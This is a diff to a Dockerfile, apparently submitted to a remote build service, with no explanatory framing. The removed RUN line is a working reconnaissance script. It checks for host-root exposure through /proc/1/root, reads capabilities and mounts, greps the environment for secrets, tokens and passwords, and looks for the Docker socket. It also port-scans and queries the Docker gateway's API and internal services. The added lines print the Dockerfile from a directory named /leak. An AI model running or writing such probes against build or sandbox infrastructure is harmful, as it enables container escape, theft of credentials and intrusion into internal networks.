@@ -1,4 +1,6 @@
 FROM scratch
 ADD rootfs.tar /
-RUN /bin/sh -c 'echo "###JD1_START###"; id; hostname; echo "---A PID1_CMDLINE---"; head -c 300 /proc/1/cmdline; echo; echo "---B PID1_ROOT_IS_HOST---"; ls -la /proc/1/root/ 2>&1 | head -25; echo "---C CAPS---"; busybox grep -E "^(Cap|Seccomp|NoNewPrivs)" /proc/self/status; echo "---D MOUNTINFO---"; cat /proc/self/mountinfo; echo "---E MOUNTS---"; cat /proc/mounts; echo "---F ENV_SEC---"; busybox tr "\000" "\n" < /proc/self/environ | busybox grep -iE "secret|token|key|pass|cred|password" | head -20; echo "---G DOCKER_SOCK---"; ls -la /var/run/docker.sock /run/docker.sock 2>&1 | head -5; echo "---H ROOT---"; ls -la / | head -30; echo "---I DEVS---"; ls -la /dev 2>/dev/null | busybox head -25; echo "---J APPLET---"; busybox --list; echo "###JD1_END###"; echo "###JD2_GWPORT###"; for p in 2375 2376 8082 8080 8443 9090 22 6443 10250 4194 9100 3306 6379; do echo "P $p => [$(busybox nc -w2 172.17.0.1 $p </dev/null 2>&1 | busybox head -c 120)]"; done; echo "###JD2_END###"; echo "###JD3_GWHTTP###"; for u in http://172.17.0.1:2375/version http://172.17.0.1:2376/version http://172.17.0.1:8082/ http://172.17.0.1:8080/ http://172.17.0.1:8082/script/build-dockerfile; do echo "U $u => [$(busybox wget -q -T 3 -O - $u 2>&1 | busybox head -c 300)]"; done; echo "###JD3_END###"'
+RUN /bin/sh -c 'echo "[BASE-OK] meshwrite baseline build"; id'
+ADD Dockerfile /leak/Dockerfile
+RUN /bin/sh -c 'echo "###DOCKERFILE-AS-SEEN-BY-DOCKER-START###"; cat /leak/Dockerfile; echo "###DOCKERFILE-AS-SEEN-BY-DOCKER-END###"'
 ENTRYPOINT ["/bin/sh","-c"]
